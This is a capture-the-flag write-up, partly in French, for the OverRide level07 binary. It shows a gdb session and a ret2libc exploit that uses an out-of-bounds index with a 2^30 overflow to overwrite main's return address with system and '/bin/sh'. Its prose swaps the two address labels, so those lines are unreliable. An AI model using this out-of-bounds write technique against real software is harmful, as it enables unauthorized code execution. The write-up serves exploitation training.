```bash
level07@OverRide:~$ gdb level07 
(gdb) b store_number # store_number's call
Breakpoint 1 at 0x8048636
(gdb) b *0x080489f1 # main's ret call
Breakpoint 2 at 0x80489f1
(gdb) run

Starting program: /home/users/level07/level07 

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp+0x8 #base at the store_number entry
0xffffd530:     0xffffd554 #here

(gdb) info proc map
from 0xf7e2c000 to 0xf7fd0000 #libc mapping

(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec # "/bin/sh" address

(gdb) info functions system
0xf7e6aed0  system # "system's address

(gdb) c
Continuing.
 Number: 1
 Index: 1
 Completed store command successfully

Input command: quit

Breakpoint 2, 0x080489f1 in main ()
(gdb) p/x $esp
$1 = 0xffffd71c #main's ret adress
(gdb) c
Continuing.
[Inferior 1 (process 1842) exited normally]
```

offset index = (return address - base) / 4
(0xffffd71c - 0xffffd554) / 4 = 0x1c8/4 = 114

system = 0xf7f897ec = 4160264172
"/bin/sh" = 0xf7e6aed0 = 4159090384

114 ≡ 0 (mod 3) → bloqué par “reserved for wil”. Utilise l’index équivalent 114 + 2^30 = 1073741938

```bash
Input command: store
Number: 4159090384
Index: 1073741938      # 114 + 2^30

Input command: store
Number: 1094795585 # facultatif
Index: 115

Input command: store
Number: 4160264172
Index: 116
```